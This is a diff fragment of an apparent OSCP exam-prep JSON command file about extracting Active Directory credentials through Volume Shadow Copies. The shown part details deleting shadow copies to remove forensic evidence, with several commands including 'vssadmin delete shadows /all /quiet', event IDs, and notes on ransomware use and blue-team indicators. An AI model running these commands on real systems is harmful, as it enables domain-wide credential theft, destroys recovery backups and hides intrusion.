+      "notes": "CRITICAL OPSEC STEP - remove evidence of shadow copy abuse. TIME: 5-15 seconds. EXAM CONSIDERATION: Delete shadows AFTER credentials extracted and files transferred to Kali. Don't delete prematurely (may need to re-extract if transfer fails). DISK SPACE: Shadow copies consume 10-30% of volume size - deletion frees significant space. FORENSIC EVIDENCE: Shadow copy creation logs Event ID 8222 (VSS), usage logs 4663 (file access), deletion logs 8224. Deletion removes snapshots but NOT event logs (requires log clearing). ALTERNATIVES: (1) Delete oldest only: vssadmin delete shadows /for=C: /oldest /quiet (preserve recent shadows for legitimate backup). (2) Delete specific shadow: vssadmin delete shadows /shadow={GUID} (from vssadmin list shadows output). (3) PowerShell: Get-WmiObject Win32_ShadowCopy | Where-Object {$_.VolumeName -eq 'C:\\\\'} | ForEach-Object {$_.Delete()}. RANSOMWARE TECHNIQUE: Attackers often delete shadows to prevent recovery (vssadmin delete shadows /all /quiet). Blue team IOC: Unexpected shadow deletion, especially with /quiet flag. EXAM STRATEGY: Trade-off between stealth (delete shadows) vs backup (keep shadows for re-extraction if needed). Recommend: Keep shadows until final credential validation, then delete before moving to next target.",
+      "filled_example": "vssadmin delete shadows /for=C: /all /quiet"
     }
   ],
   "metadata": {
     "file_purpose": "Volume Shadow Copy exploitation for Active Directory credential extraction via NTDS.dit database offline parsing",
     "oscp_relevance": "HIGH - Essential post-exploitation technique for Domain Controller credential harvesting. Exam-relevant: Persistence, credential access, offline analysis without detection.",
-    "educational_context": "Shadow Copies (Volume Shadow Service - VSS) are Windows point-in-time snapshots allowing access to locked files. NTDS.dit (Active Directory database) is locked during DC operation - shadow copies bypass lock to extract database for offline credential parsing. Alternative to DCSync (requires replication rights) - shadow copies require local Administrator on DC. Process: Create shadow → Extract NTDS.dit from shadow → Export SYSTEM hive → Parse offline on Kali with secretsdump → Obtain all domain NTLM hashes and Kerberos keys.",
+    "educational_context": "Shadow Copies (Volume Shadow Service - VSS) are Windows point-in-time snapshots allowing access to locked files. NTDS.dit (Active Directory database) is locked during DC operation - shadow copies bypass lock to extract database for offline credential parsing. Alternative to DCSync (requires replication rights) - shadow copies require local Administrator on DC. Process: Create shadow \u2192 Extract NTDS.dit from shadow \u2192 Export SYSTEM hive \u2192 Parse offline on Kali with secretsdump \u2192 Obtain all domain NTLM hashes and Kerberos keys.",
     "prerequisites": [
       "Local Administrator OR SeBackupPrivilege on target Domain Controller",
       "Volume Shadow Copy Service (VSS) enabled and running (default on Windows Server)",
